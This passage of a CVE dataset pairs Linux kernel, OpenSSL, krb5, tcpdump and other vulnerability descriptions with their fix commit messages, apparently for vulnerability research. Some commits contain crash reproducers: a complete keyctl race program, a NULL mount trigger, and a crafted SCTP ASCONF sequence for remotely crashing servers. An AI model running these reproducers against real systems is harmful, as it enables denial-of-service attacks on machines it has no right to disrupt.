reqfd = accept(algfd, 0, 0);             setsockopt(algfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));             read(reqfd, key, sizeof(key));     }  Reported-by: syzbot <syzkaller@googlegroups.com> Fixes: eb6f13e (""[CRYPTO] salsa20_generic: Fix multi-page processing"") Cc: <stable@vger.kernel.org> # v2.6.25+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2011-4611,CWE-189,2012-05-17,Integer overflow in the perf_event_interrupt function in arch/powerpc/kernel/perf_event.c in the Linux kernel before 2.6.39 on powerpc platforms allows local users to cause a denial of service (unhandled performance monitor exception) via vectors that trigger certain outcomes of performance events.,Events on POWER7 can roll back if a speculative event doesn't eventually complete. Unfortunately in some rare cases they will raise a performance monitor exception. We need to catch this to ensure we reset the PMC. In all cases the PMC will be 256 or less cycles from overflow.  Signed-off-by: Anton Blanchard <anton@samba.org> Signed-off-by: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: <stable@kernel.org> # as far back as it applies cleanly LKML-Reference: <20110309143842.6c22845e@kryten> Signed-off-by: Ingo Molnar <mingo@elte.hu>
CVE-2013-4512,CWE-119,2013-11-12,Buffer overflow in the exitcode_proc_write function in arch/um/kernel/exitcode.c in the Linux kernel before 3.12 allows local users to cause a denial of service or possibly have unspecified other impact by leveraging root privileges for a write operation.,We don't cap the size of buffer from the user so we could write past the end of the array here.  Only root can write to this file.  Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2011-4081,CWE-476,2012-05-24,"crypto/ghash-generic.c in the Linux kernel before 3.1 allows local users to cause a denial of service (NULL pointer dereference and OOPS) or possibly have unspecified other impact by triggering a failed or missing ghash_setkey function call, followed by a (1) ghash_update function call or (2) ghash_final function call, as demonstrated by a write operation on an AF_ALG socket.","The ghash_update function passes a pointer to gf128mul_4k_lle which will be NULL if ghash_setkey is not called or if the most recent call to ghash_setkey failed to allocate memory.  This causes an oops.  Fix this up by returning an error code in the null case.  This is trivially triggered from unprivileged userspace through the AF_ALG interface by simply writing to the socket without setting a key.  The ghash_final function has a similar issue, but triggering it requires a memory allocation failure in ghash_setkey _after_ at least one successful call to ghash_update.    BUG: unable to handle kernel NULL pointer dereference at 00000670   IP: [<d88c92d4>] gf128mul_4k_lle+0x23/0x60 [gf128mul]   *pde = 00000000   Oops: 0000 [#1] PREEMPT SMP   Modules linked in: ghash_generic gf128mul algif_hash af_alg nfs lockd nfs_acl sunrpc bridge ipv6 stp llc    Pid: 1502, comm: hashatron Tainted: G        W   3.1.0-rc9-00085-ge9308cf #32 Bochs Bochs   EIP: 0060:[<d88c92d4>] EFLAGS: 00000202 CPU: 0   EIP is at gf128mul_4k_lle+0x23/0x60 [gf128mul]   EAX: d69db1f0 EBX: d6b8ddac ECX: 00000004 EDX: 00000000   ESI: 00000670 EDI: d6b8ddac EBP: d6b8ddc8 ESP: d6b8dda4    DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068   Process hashatron (pid: 1502, ti=d6b8c000 task=d6810000 task.ti=d6b8c000)   Stack:    00000000 d69db1f0 00000163 00000000 d6b8ddc8 c101a520 d69db1f0 d52aa000    00000ff0 d6b8dde8 d88d310f d6b8a3f8 d52aa000 00001000 d88d502c d6b8ddfc    00001000 d6b8ddf4 c11676e d69db1e8 d6b8de24 c11679ad d52aa000 00000000   Call Trace:    [<c101a520>] ? kmap_atomic_prot+0x37/0xa6    [<d88d310f>] ghash_update+0x85/0xbe [ghash_generic]    [<c11676ed>] crypto_shash_update+0x18/0x1b    [<c11679ad>] shash_ahash_update+0x22/0x36    [<c11679cc>] shash_async_update+0xb/0xd    [<d88ce0ba>] hash_sendpage+0xba/0xf2 [algif_hash]    [<c121b24c>] kernel_sendpage+0x39/0x4e    [<d88ce000>] ? 0xd88cdfff    [<c121b298>] sock_sendpage+0x37/0x3e    [<c121b261>] ? kernel_sendpage+0x4e/0x4e    [<c10b4dbc>] pipe_to_sendpage+0x56/0x61    [<c10b4e1f>] splice_from_pipe_feed+0x58/0xcd    [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10    [<c10b51f5>] __splice_from_pipe+0x36/0x55    [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10    [<c10b6383>] splice_from_pipe+0x51/0x64    [<c10b63c2>] ? default_file_splice_write+0x2c/0x2c    [<c10b63d5>] generic_splice_sendpage+0x13/0x15    [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10    [<c10b527f>] do_splice_from+0x5d/0x67    [<c10b6865>] sys_splice+0x2bf/0x363    [<c129373b>] ? sysenter_exit+0xf/0x16    [<c104dc1e>] ? trace_hardirqs_on_caller+0x10e/0x13f    [<c129370c>] sysenter_do_call+0x12/0x32   Code: 83 c4 0c 5b 5e 5f c9 c3 55 b9 04 00 00 00 89 e5 57 8d 7d e4 56 53 8d 5d e4 83 ec 18 89 45 e0 89 55 dc 0f b6 70 0f c1 e6 04 01 d6 <f3> a5 be 0f 00 00 00 4e 89 d8 e8 48 ff ff ff 8b 45 e0 89 da 0f   EIP: [<d88c92d4>] gf128mul_4k_lle+0x23/0x60 [gf128mul] SS:ESP 0068:d6b8dda4   CR2: 0000000000000670   ---[ end trace 4eaa2a86a8e2da24 ]---   note: hashatron[1502] exited with preempt_count 1   BUG: scheduling while atomic: hashatron/1502/0x10000002   INFO: lockdep is turned off.   [...]  Signed-off-by: Nick Bowler <nbowler@elliptictech.com> Cc: stable@kernel.org [2.6.37+] Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2017-12989,CWE-835,2017-09-14,The RESP parser in tcpdump before 4.9.2 could enter an infinite loop due to a bug in print-resp.c:resp_get_length().,"Make sure that it always sends *endp before returning and that, for invalid lengths where we don't like a character in the length string, what it sets *endp to is past the character in question, so we don't run the risk of infinitely looping (or doing something else random) if a character in the length is invalid.  This fixes an infinite loop discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s)."
CVE-2015-8630,,2016-02-13,The (1) kadm5_create_principal_3 and (2) kadm5_modify_principal functions in lib/kadm5/srv/svr_principal.c in kadmind in MIT Kerberos 5 (aka krb5) 1.12.x and 1.13.x before 1.13.4 and 1.14.x before 1.14.1 allow remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) by specifying KADM5_POLICY with a NULL policy name.,"In kadm5_create_principal_3() and kadm5_modify_principal(), check for entry->policy being null when KADM5_POLICY is included in the mask.  CVE-2015-8630:  In MIT krb5 1.12 and later, an authenticated attacker with permission to modify a principal entry can cause kadmind to dereference a null pointer by supplying a null policy value but including KADM5_POLICY in the mask.      CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C  ticket: 8342 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup"
CVE-2011-2518,CWE-20,2012-05-24,"The tomoyo_mount_acl function in security/tomoyo/mount.c in the Linux kernel before 2.6.39.2 calls the kern_path function with arguments taken directly from a mount system call, which allows local users to cause a denial of service (OOPS) or possibly have unspecified other impact via a NULL value for the device name.","In tomoyo_mount_acl() since 2.6.36, kern_path() was called without checking dev_name != NULL. As a result, an unprivileged user can trigger oops by issuing mount(NULL, ""/"", ""ext3"", 0, NULL) request. Fix this by checking dev_name != NULL before calling kern_path(dev_name).  Signed-off-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> Cc: stable@kernel.org Signed-off-by: James Morris <jmorris@namei.org>"
CVE-2016-10093,CWE-119,2017-03-01,"Integer overflow in tools/tiffcp.c in LibTIFF 4.0.7, 3.9.3, 3.9.4, 3.9.5, 3.9.6, 3.9.7, 4.0.0alpha4, 4.0.0alpha5, 4.0.0alpha6, 4.0.0beta7, 4.0.0, 4.0.1, 4.0.2, 4.0.3, 4.0.4, 4.0.4beta, 4.0.5 and 4.0.6 allows remote attackers to have unspecified impact via a crafted image, which triggers a heap-based buffer overflow.",buffer overflow. Reported by Agostino Sarubbo. Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2610
CVE-2013-7016,CWE-119,2013-12-09,"The get_siz function in libavcodec/jpeg2000dec.c in FFmpeg before 2.1 does not ensure the expected sample separation, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.",Some invalid values where not handled correctly in the later pixel format matching code. Fixes out of array accesses Fixes Ticket2848  Found-by: Piotr Bandurski <ami_stuff@o2.pl> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2015-1593,CWE-264,2015-03-16,"The stack randomization feature in the Linux kernel before 3.19.1 on 64-bit platforms uses incorrect data types for the results of bitwise left-shift operations, which makes it easier for attackers to bypass the ASLR protection mechanism by predicting the address of the top of the stack, related to the randomize_stack_top function in fs/binfmt_elf.c and the stack_maxrandom_size function in arch/x86/mm/mmap.c.",
CVE-2016-9560,CWE-787,2017-02-15,Stack-based buffer overflow in the jpc_tsfb_getbands2 function in jpc_tsfb.c in JasPer before 1.900.30 allows remote attackers to have unspecified impact via a crafted image.,
CVE-2017-6435,CWE-119,2017-03-15,The parse_string_node function in bplist.c in libimobiledevice libplist 1.12 allows local users to cause a denial of service (memory corruption) via a crafted plist file.,Credit to Wang Junjie <zhunkibatu@gmail.com> (#93)
CVE-2017-5522,CWE-119,2017-03-15,"Stack-based buffer overflow in MapServer before 6.0.6, 6.2.x before 6.2.4, 6.4.x before 6.4.5, and 7.0.x before 7.0.4 allows remote attackers to cause a denial of service (crash) or execute arbitrary code via vectors involving WFS get feature requests.",
CVE-2018-12326,CWE-119,2018-06-17,"Buffer overflow in redis-cli of Redis before 4.0.10 and 5.x before 5.0 RC3 allows an attacker to achieve code execution and escalate to higher privileges via a crafted command line. NOTE: It is unclear whether there are any common situations in which redis-cli is used with, for example, a -h (aka hostname) argument from an untrusted source.","Thanks to Fakhri Zulkifli for reporting it.  The fix switched to dynamic allocation, copying the final prompt in the static buffer only at the end."
CVE-2017-17854,CWE-190,2017-12-27,kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (integer overflow and memory corruption) or possibly have unspecified other impact by leveraging unrestricted integer values for pointer arithmetic.,"There were various issues related to the limited size of integers used in the verifier:  - `off + size` overflow in __check_map_access()  - `off + reg->off` overflow in check_mem_access()  - `off + reg->var_off.value` overflow or 32-bit truncation of    `reg->var_off.value` in check_mem_access()  - 32-bit truncation in check_stack_boundary()  Make sure that any integer math cannot overflow by not allowing pointer math with large values.  Also reduce the scope of ""scalar op scalar"" tracking.  Fixes: f1174f7 (""bpf/verifier: rework value tracking"") Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2017-13033,CWE-125,2017-09-14,The VTP parser in tcpdump before 4.9.2 has a buffer over-read in print-vtp.c:vtp_print().,"This fixes a buffer over-read discovered by Bhargava Shastry.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture.  Update another VTP test's .out file for this change.  Don't treate a TLV type or length of 0 as invalid; a type of 0 should just be reported as illegal if that type isn't used, and the length is the length of the *value*, not the length of the entire TLV, so if it's zero there won't be an infinite loop.  (It's still not *legal*, as the values of all the TLVs we handle are 1 16-bit word long; we added a check for that.)  Update some comments while we're at it, to give a new URL for one Cisco page and a non-Cisco URL for another former Cisco page (Cisco's UniverCD pages don't seem to be available any more, and Cisco's robots.txt file didn't allow the Wayback Machine to archive it)."
CVE-2013-3231,CWE-200,2013-04-22,"The llc_ui_recvmsg function in net/llc/af_llc.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","For stream sockets the code misses to update the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory. The msg_namelen update is also missing for datagram sockets in case the socket is shutting down during receive.  Fix both issues by setting msg_namelen to 0 early. It will be updated later if we're going to fill the msg_name member.  Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-9390,CWE-20,2017-03-23,The jas_seq2d_create function in jas_seq.c in JasPer before 1.900.14 allows remote attackers to cause a denial of service (assertion failure) via a crafted image file.,
CVE-2018-13006,CWE-125,2018-06-29,An issue was discovered in MP4Box in GPAC 0.7.1. There is a heap-based buffer over-read in the isomedia/box_dump.c function hdlr_dump.,
CVE-2019-1563,CWE-203,2019-09-10,"In situations where an attacker receives automated notification of the success or failure of a decryption attempt an attacker, after sending a very large number of messages to be decrypted, can recover a CMS/PKCS7 transported encryption key or decrypt any RSA encrypted message that was encrypted with the public RSA key, using a Bleichenbacher padding oracle attack. Applications are not affected if they use a certificate together with the private RSA key to the CMS_decrypt or PKCS7_decrypt functions to select the correct recipient info to decrypt. Fixed in OpenSSL 1.1.1d (Affected 1.1.1-1.1.1c). Fixed in OpenSSL 1.1.0l (Affected 1.1.0-1.1.0k). Fixed in OpenSSL 1.0.2t (Affected 1.0.2-1.0.2s).",
CVE-2017-5206,,2017-03-23,"Firejail before 0.9.44.4, when running on a Linux kernel before 4.8, allows context-dependent attackers to bypass a seccomp-based sandbox protection mechanism via the --allow-debuggers argument.",
CVE-2014-0221,,2014-06-05,"The dtls1_get_message_fragment function in d1_both.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h allows remote attackers to cause a denial of service (recursion and client crash) via a DTLS hello message in an invalid DTLS handshake.",
CVE-2015-7837,CWE-254,2017-09-19,"The Linux kernel, as used in Red Hat Enterprise Linux 7, kernel-rt, and Enterprise MRG 2 and when booted with UEFI Secure Boot enabled, allows local users to bypass intended securelevel/secureboot restrictions by leveraging improper handling of secure_boot flag across kexec reboot.","Kexec reboot in case secure boot being enabled does not keep the secure boot mode in new kernel, so later one can load unsigned kernel via legacy kexec_load.  In this state, the system is missing the protections provided by secure boot. Adding a patch to fix this by retain the secure_boot flag in original kernel.  secure_boot flag in boot_params is set in EFI stub, but kexec bypasses the stub. Fixing this issue by copying secure_boot flag across kexec reboot.  Signed-off-by: Dave Young <dyoung@redhat.com>"
CVE-2015-2698,CWE-119,2015-11-13,"The iakerb_gss_export_sec_context function in lib/gssapi/krb5/iakerb.c in MIT Kerberos 5 (aka krb5) 1.14 pre-release 2015-09-14 improperly accesses a certain pointer, which allows remote authenticated users to cause a denial of service (memory corruption) or possibly have unspecified other impact by interacting with an application that calls the gss_export_sec_context function.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2015-2696.","The patches for CVE-2015-2696 contained a regression in the newly added IAKERB iakerb_gss_export_sec_context() function, which could cause it to corrupt memory.  Fix the regression by properly dereferencing the context_handle pointer before casting it.  Also, the patches did not implement an IAKERB gss_import_sec_context() function, under the erroneous belief that an exported IAKERB context would be tagged as a krb5 context.  Implement it now to allow IAKERB contexts to be successfully exported and imported after establishment.  CVE-2015-2698:  In any MIT krb5 release with the patches for CVE-2015-2696 applied, an application which calls gss_export_sec_context() may experience memory corruption if the context was established using the IAKERB mechanism. Historically, some vulnerabilities of this nature can be translated into remote code execution, though the necessary exploits must be tailored to the individual application and are usually quite complicated.      CVSSv2 Vector: AV:N/AC:H/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C  ticket: 8273 (new) target_version: 1.14 tags: pullup"
CVE-2017-16645,CWE-125,2017-11-07,The ims_pcu_get_cdc_union_desc function in drivers/input/misc/ims-pcu.c in the Linux kernel through 4.13.11 allows local users to cause a denial of service (ims_pcu_parse_cdc_data out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.,"Before trying to use CDC union descriptor, try to validate whether that it is sane by checking that intf->altsetting->extra is big enough and that descriptor bLength is not too big and not too small.  Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>"
CVE-2016-6255,CWE-284,2017-03-07,Portable UPnP SDK (aka libupnp) before 1.6.21 allows remote attackers to write to arbitrary files in the webroot via a POST request without a registered handler.,"If there's no registered handler for a POST request, the default behaviour is to write it to the filesystem. Several million deployed devices appear to have this behaviour, making it possible to (at least) store arbitrary data on them. Add a configure option that enables this behaviour, and change the default to just drop POSTs that aren't directly handled."
CVE-2017-6353,CWE-415,2017-03-01,"net/sctp/socket.c in the Linux kernel through 4.10.1 does not properly restrict association peel-off operations during certain wait states, which allows local users to cause a denial of service (invalid unlock and double free) via a multithreaded application.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2017-5986.","commit 2dcab59 (""sctp: avoid BUG_ON on sctp_wait_for_sndbuf"") attempted to avoid a BUG_ON call when the association being used for a sendmsg() is blocked waiting for more sndbuf and another thread did a peeloff operation on such asoc, moving it to another socket.  As Ben Hutchings noticed, then in such case it would return without locking back the socket and would cause two unlocks in a row.  Further analysis also revealed that it could allow a double free if the application managed to peeloff the asoc that is created during the sendmsg call, because then sctp_sendmsg() would try to free the asoc that was created only for that call.  This patch takes another approach. It will deny the peeloff operation if there is a thread sleeping on the asoc, so this situation doesn't exist anymore. This avoids the issues described above and also honors the syscalls that are already being handled (it can be multiple sendmsg calls).  Joint work with Xin Long.  Fixes: 2dcab59 (""sctp: avoid BUG_ON on sctp_wait_for_sndbuf"") Cc: Alexander Popov <alex.popov@linux.com> Cc: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Signed-off-by: Xin Long <lucien.xin@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-11413,CWE-674,2019-04-22,An issue was discovered in Artifex MuJS 1.0.5. It has unlimited recursion because the match function in regexp.c lacks a depth check.,Also handle negative return code as an error in the JS bindings.
CVE-2016-10070,CWE-125,2017-03-03,Heap-based buffer overflow in the CalcMinMax function in coders/mat.c in ImageMagick before 6.9.4-0 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted mat file.,
CVE-2015-8629,CWE-125,2016-02-13,"The xdr_nullstring function in lib/kadm5/kadm_rpc_xdr.c in kadmind in MIT Kerberos 5 (aka krb5) before 1.13.4 and 1.14.x before 1.14.1 does not verify whether '\0' characters exist as expected, which allows remote authenticated users to obtain sensitive information or cause a denial of service (out-of-bounds read) via a crafted string.","In xdr_nullstring(), check that the decoded string is terminated with a zero byte and does not contain any internal zero bytes.  CVE-2015-8629:  In all versions of MIT krb5, an authenticated attacker can cause kadmind to read beyond the end of allocated memory by sending a string without a terminating zero byte.  Information leakage may be possible for an attacker with permission to modify the database.      CVSSv2 Vector: AV:N/AC:H/Au:S/C:P/I:N/A:N/E:POC/RL:OF/RC:C  ticket: 8341 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup"
CVE-2014-3673,CWE-20,2014-11-10,"The SCTP implementation in the Linux kernel through 3.17.2 allows remote attackers to cause a denial of service (system crash) via a malformed ASCONF chunk, related to net/sctp/sm_make_chunk.c and net/sctp/sm_statefuns.c.","Commit 6f4c618 (""SCTP : Add paramters validity check for ASCONF chunk"") added basic verification of ASCONF chunks, however, it is still possible to remotely crash a server by sending a special crafted ASCONF chunk, even up to pre 2.6.12 kernels:  skb_over_panic: text:ffffffffa01ea1c3 len:31056 put:30768  head:ffff88011bd81800 data:ffff88011bd81800 tail:0x7950  end:0x440 dev:<NULL>  ------------[ cut here ]------------ kernel BUG at net/core/skbuff.c:129! [...] Call Trace:  <IRQ>  [<ffffffff8144fb1c>] skb_put+0x5c/0x70  [<ffffffffa01ea1c3>] sctp_addto_chunk+0x63/0xd0 [sctp]  [<ffffffffa01eadaf>] sctp_process_asconf+0x1af/0x540 [sctp]  [<ffffffff8152d025>] ? _read_unlock_bh+0x15/0x20  [<ffffffffa01e0038>] sctp_sf_do_asconf+0x168/0x240 [sctp]  [<ffffffffa01e3751>] sctp_do_sm+0x71/0x1210 [sctp]  [<ffffffff8147645d>] ? fib_rules_lookup+0xad/0xf0  [<ffffffffa01e6b22>] ? sctp_cmp_addr_exact+0x32/0x40 [sctp]  [<ffffffffa01e8393>] sctp_assoc_bh_rcv+0xd3/0x180 [sctp]  [<ffffffffa01ee986>] sctp_inq_push+0x56/0x80 [sctp]  [<ffffffffa01fcc42>] sctp_rcv+0x982/0xa10 [sctp]  [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23/0x28 [iptable_filter]  [<ffffffff8148bdc9>] ? nf_iterate+0x69/0xb0  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8148bf86>] ? nf_hook_slow+0x76/0x120  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff81496ded>] ip_local_deliver_finish+0xdd/0x2d0  [<ffffffff81497078>] ip_local_deliver+0x98/0xa0  [<ffffffff8149653d>] ip_rcv_finish+0x12d/0x440  [<ffffffff81496ac5>] ip_rcv+0x275/0x350  [<ffffffff8145c88b>] __netif_receive_skb+0x4ab/0x750  [<ffffffff81460588>] netif_receive_skb+0x58/0x60  This can be triggered e.g., through a simple scripted nmap connection scan injecting the chunk after the handshake, for example, ...    -------------- INIT[ASCONF; ASCONF_ACK] ------------->   <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------   ------------------ ASCONF; UNKNOWN ------------------>  ... where ASCONF chunk of length 280 contains 2 parameters ...    1) Add IP address parameter (param length: 16)   2) Add/del IP address parameter (param length: 255)  ... followed by an UNKNOWN chunk of e.g. 4 bytes. Here, the Address Parameter in the ASCONF chunk is even missing, too. This is just an example and similarly-crafted ASCONF chunks could be used just as well.  The ASCONF chunk passes through sctp_verify_asconf() as all parameters passed sanity checks, and after walking, we ended up successfully at the chunk end boundary, and thus may invoke sctp_process_asconf(). Parameter walking is done with WORD_ROUND() to take padding into account.  In sctp_process_asconf()'s TLV processing, we may fail in sctp_process_asconf_param() e.g., due to removal of the IP address that is also the source address of the packet containing the ASCONF chunk, and thus we need to add all TLVs after the failure to our ASCONF response to remote via helper function sctp_add_asconf_response(), which basically invokes a sctp_addto_chunk() adding the error parameters to the given skb.  When walking to the next parameter this time, we proceed with ...    length = ntohs(asconf_param->param_hdr.length);   asconf_param = (void *)asconf_param + length;  ... instead of the WORD_ROUND()'ed length, thus resulting here in an off-by-one that leads to reading the follow-up garbage parameter length of 12336, and thus throwing an skb_over_panic for the reply when trying to sctp_addto_chunk() next time, which implicitly calls the skb_put() with that length.  Fix it by using sctp_walk_params() [ which is also used in INIT parameter processing ] macro in the verification *and* in ASCONF processing: it will make sure we don't spill over, that we walk parameters WORD_ROUND()'ed. Moreover, we're being more defensive and guard against unknown parameter types and missized addresses.  Joint work with Vlad Yasevich.  Fixes: b896b82 (""[SCTP] ADDIP: Support for processing incoming ASCONF_ACK chunks."") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2012-6545,CWE-200,2013-03-15,"The Bluetooth RFCOMM implementation in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel memory via a crafted application.",The RFCOMM code fails to initialize the two padding bytes of struct rfcomm_dev_list_req inserted for alignment before copying it to userland. Additionally there are two padding bytes in each instance of struct rfcomm_dev_info. The ioctl() that for disclosures two bytes plus dev_num times two bytes uninitialized kernel heap memory.  Allocate the memory using kzalloc() to fix this issue.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2018-15910,CWE-704,2018-08-27,"In Artifex Ghostscript before 9.24, attackers able to supply crafted PostScript files could use a type confusion in the LockDistillerParams parameter to crash the interpreter or execute code.",
CVE-2017-12897,CWE-125,2017-09-14,The ISO CLNS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isoclns_print().,"This fixes a buffer over-read discovered by Kamil Frankowicz.  Don't pass the remaining caplen - that's too hard to get right, and we were getting it wrong in at least one case; just use ND_TTEST().  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-7889,CWE-732,2017-04-17,"The mm subsystem in the Linux kernel through 3.2 does not properly enforce the CONFIG_STRICT_DEVMEM protection mechanism, which allows local users to read or write to kernel memory locations in the first megabyte (and bypass slab-allocation access restrictions) via an application that opens the /dev/mem file, related to arch/x86/mm/init.c and drivers/char/mem.c.","Under CONFIG_STRICT_DEVMEM, reading System RAM through /dev/mem is disallowed. However, on x86, the first 1MB was always allowed for BIOS and similar things, regardless of it actually being System RAM. It was possible for heap to end up getting allocated in low 1MB RAM, and then read by things like x86info or dd, which would trip hardened usercopy:  usercopy: kernel memory exposure attempt detected from ffff880000090000 (dma-kmalloc-256) (4096 bytes)  This changes the x86 exception for the low 1MB by reading back zeros for System RAM areas instead of blindly allowing them. More work is needed to extend this to mmap, but currently mmap doesn't go through usercopy, so hardened usercopy won't Oops the kernel.  Reported-by: Tommi Rantala <tommi.t.rantala@nokia.com> Tested-by: Tommi Rantala <tommi.t.rantala@nokia.com> Signed-off-by: Kees Cook <keescook@chromium.org>"
CVE-2010-5331,CWE-193,2019-07-27,"In the Linux kernel before 2.6.34, a range check issue in drivers/gpu/drm/radeon/atombios.c could cause an off by one (buffer overflow) problem. NOTE: At least one Linux maintainer believes that this CVE is incorrectly assigned and should be rejected because the value is hard coded and are not user-controllable where it is used","This change makes the array larger, ""MAX_SUPPORTED_TV_TIMING_V1_2"" is 3 and the original size ""MAX_SUPPORTED_TV_TIMING"" is 2.  Also there were checks that were off by one.  Signed-off-by: Dan Carpenter <error27@gmail.com> Acked-by: Alex Deucher <alexdeucher@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Dave Airlie <airlied@redhat.com>"
CVE-2010-4250,CWE-399,2012-06-21,Memory leak in the inotify_init1 function in fs/notify/inotify/inotify_user.c in the Linux kernel before 2.6.37 allows local users to cause a denial of service (memory consumption) via vectors involving failed attempts to create files.,If inotify_init is unable to allocate a new file for the new inotify group we leak the new group.  This patch drops the reference on the group on file allocation failure.  Reported-by: Vegard Nossum <vegard.nossum@gmail.com> cc: stable@kernel.org Signed-off-by: Eric Paris <eparis@redhat.com>
CVE-2018-16802,,2018-09-10,"An issue was discovered in Artifex Ghostscript before 9.25. Incorrect ""restoration of privilege"" checking when running out of stack during exception handling could be used by attackers able to supply crafted PostScript to execute code using the ""pipe"" instruction. This is due to an incomplete fix for CVE-2018-16509.",
CVE-2015-7550,CWE-362,2016-02-08,"The keyctl_read_key function in security/keys/keyctl.c in the Linux kernel before 4.3.4 does not properly use a semaphore, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a crafted application that leverages a race condition between keyctl_revoke and keyctl_read calls.","This fixes CVE-2015-7550.  There's a race between keyctl_read() and keyctl_revoke().  If the revoke happens between keyctl_read() checking the validity of a key and the key's semaphore being taken, then the key type read method will see a revoked key.  This causes a problem for the user-defined key type because it assumes in its read method that there will always be a payload in a non-revoked key and doesn't check for a NULL pointer.  Fix this by making keyctl_read() check the validity of a key after taking semaphore instead of before.  I think the bug was introduced with the original keyrings code.  This was discovered by a multithreaded test program generated by syzkaller (http://github.com/google/syzkaller).  Here's a cleaned up version:  	#include <sys/types.h> 	#include <keyutils.h> 	#include <pthread.h> 	void *thr0(void *arg) 	{ 		key_serial_t key = (unsigned long)arg; 		keyctl_revoke(key); 		return 0; 	} 	void *thr1(void *arg) 	{ 		key_serial_t key = (unsigned long)arg; 		char buffer[16]; 		keyctl_read(key, buffer, 16); 		return 0; 	} 	int main() 	{ 		key_serial_t key = add_key(""user"", ""%"", ""foo"", 3, KEY_SPEC_USER_KEYRING); 		pthread_t th[5]; 		pthread_create(&th[0], 0, thr0, (void *)(unsigned long)key); 		pthread_create(&th[1], 0, thr1, (void *)(unsigned long)key); 		pthread_create(&th[2], 0, thr0, (void *)(unsigned long)key); 		pthread_create(&th[3], 0, thr1, (void *)(unsigned long)key); 		pthread_join(th[0], 0); 		pthread_join(th[1], 0); 		pthread_join(th[2], 0); 		pthread_join(th[3], 0); 		return 0; 	}  Build as:  	cc -o keyctl-race keyctl-race.c -lkeyutils -lpthread  Run as:  	while keyctl-race; do :; done  as it may need several iterations to crash the kernel.  The crash can be summarised as:  	BUG: unable to handle kernel NULL pointer dereference at 0000000000000010 	IP: [<ffffffff81279b08>] user_read+0x56/0xa3 	... 	Call Trace: 	 [<ffffffff81276aa9>] keyctl_read_key+0xb6/0xd7 	 [<ffffffff81277815>] SyS_keyctl+0x83/0xe0 	 [<ffffffff815dbb97>] entry_SYSCALL_64_fastpath+0x12/0x6f  Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2014-4049,CWE-119,2014-06-18,"Heap-based buffer overflow in the php_parserr function in ext/standard/dns.c in PHP 5.6.0beta4 and earlier allows remote servers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted DNS TXT record, related to the dns_get_record function.",* PHP-5.6:   Fix potential segfault in dns_get_record()
